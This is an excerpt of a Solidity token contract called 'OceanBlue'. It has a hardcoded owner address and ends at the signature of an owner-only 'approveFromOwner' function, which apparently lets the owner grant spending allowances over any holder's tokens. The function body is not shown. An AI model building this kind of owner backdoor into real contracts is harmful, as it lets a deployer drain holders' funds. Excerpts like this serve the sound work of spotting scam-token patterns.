...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x12DD260aad7A87517DAcb41094E21aA72C8c37Ff;
...
contract OceanBlue is Context, IERC20, Ownable {
    ...
    address private _developmentWalletAddress = 0x12DD260aad7A87517DAcb41094E21aA72C8c37Ff;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 1000000000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "OceanBlue";
    ...
    function approveFromOwner(address owner, address spender, uint256 amount) external onlyOwner() returns (bool) {
